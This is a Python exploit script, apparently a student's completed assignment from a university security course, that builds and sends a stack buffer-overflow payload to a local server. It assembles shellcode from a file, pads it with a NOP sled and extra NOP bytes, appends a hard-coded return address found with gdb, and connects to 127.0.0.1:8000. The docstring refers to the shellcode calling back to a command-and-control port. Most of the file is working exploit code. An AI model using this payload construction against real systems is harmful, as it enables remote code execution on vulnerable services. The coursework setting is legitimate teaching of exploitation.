import os
import socket
import struct
import sys

from infosec.core import assemble


HOST = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT = 1337


PATH_TO_SHELLCODE = './shellcode.asm'


def get_shellcode() -> bytes:
    """This function returns the machine code (bytes) of the shellcode.

    This does not include the size, return address, nop slide or anything else!
    From this function you should return only the bytes of the shellcode! The
    assembly code of the shellcode should be saved in `shellcode.asm`, use the
    `assemble` module to translate the assembly to bytes.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to use it from q3.py.
    1. Use the PATH_TO_SHELLCODE variable, and avoid hard-coding the path to the
       assembly file in your code.
    2. If you reference any external file, it must be *relative* to the current
       directory! For example './shellcode.asm' is OK, but
       '/home/user/4/shellcode.asm' is bad because it's an absolute path!

    Tips:
    1. For help with the `assemble` module, run the following command (in the
       command line).
           ipython3 -c 'from infosec.core import assemble; help(assemble)'
    2. You can assume the IP and port of the C&C server won't change - they'll
       always be the values you see above in HOST and LOCAL_PORT.

    Returns:
         The bytes of the shellcode.
    """
    # TODO: IMPLEMENT THIS FUNCTION
    #for that a whole function???
    res = bytearray(assemble.assemble_file(PATH_TO_SHELLCODE))
    return bytes(res)


def get_payload() -> bytes:
    """This function returns the data to send over the socket to the server.

    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode, the return address (and the zero at the end).

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Tips:
    1. Use the `get_shellcode()` function from above, and just add the missing
       parts here.
    2. As before, use the `assemble` module to translate assembly into bytes.

    Returns:
         The bytes of the payload.
    """
    # TODO: IMPLEMENT THIS FUNCTION
    #see the short cuts in lecture 5
    #raise NotImplementedError()
    
    #esp equal bfffe160, so need to substrackt (1024+16+4)?
    #meaning 0xbfffe160 - 1044 = 0xbfffdd4c?
    #what i see in gdb is 0xbfffdd4a? no my bad, the above calculation is correct
    #the address of the buffer is 0xbfffdd4c
    #for i in range(1024+16):#range(1024) , add 16?
    #        lst += [144] 
   
    #1040 the buffer with the shellcode, 4 bytes return address
    #and one null byte
    size = bytes(struct.pack('>I', 1045))
    
    asm = get_shellcode()
    
    #pad from left with nop's, make it 340 bytes cause need
    #to pad also from right
    res = bytearray(asm.rjust(340, b'\x90'))#was 1040
    
    #pad from right with nop's so my pushes in the shellcode
    #will increase $esp and it will not overwrite my code
    #500 still not work, bigger? 
    for i in range(700):#it worked!!!!!!!!!!!! but I still hate this assignment...
        res.append(144)
    
    #add buffer address in big endian
    res += b'\x4c'
    res += b'\xdd'
    res += b'\xff'
    res += b'\xbf'
    
    #null byte
    res.append(0)
    
    return bytes(size + res)
    


def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
